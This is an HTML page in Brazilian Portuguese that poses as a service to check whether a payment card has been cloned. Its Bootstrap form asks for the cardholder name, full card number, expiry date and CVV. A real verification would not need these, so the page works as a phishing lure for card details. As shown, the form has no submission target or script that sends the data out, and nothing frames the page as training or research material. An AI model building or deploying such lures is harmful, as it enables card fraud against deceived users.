<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifique se seu cartão foi clonado</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('cartao.png') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .form-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
        }
    </style>
</head>
<body>
    <div class="container d-flex justify-content-end align-items-center vh-100">
        <div class="form-container">
            <h2 class="text-center">Verifique se seu cartão foi clonado</h2>
            <form>
                <div class="mb-3">
                    <label for="nome" class="form-label">Nome no Cartão</label>
                    <input type="text" class="form-control" id="nome" placeholder="Nome impresso no cartão" required>
                </div>
                <div class="mb-3">
                    <label for="numero" class="form-label">Número do Cartão</label>
                    <input type="text" class="form-control" id="numero" placeholder="0000 0000 0000 0000" maxlength="19" pattern="\d{4} \d{4} \d{4} \d{4}" required>
                </div>
                <div class="mb-3">
                    <label for="validade" class="form-label">Validade</label>
                    <input type="text" class="form-control" id="validade" placeholder="MM/AA" maxlength="5" pattern="(0[1-9]|1[0-2])\/(\d{2})" required>
                </div>
                <div class="mb-3">
                    <label for="cvv" class="form-label">CVV</label>
                    <input type="text" class="form-control" id="cvv" placeholder="123" maxlength="3" pattern="\d{3}" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Verificar</button>
            </form>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
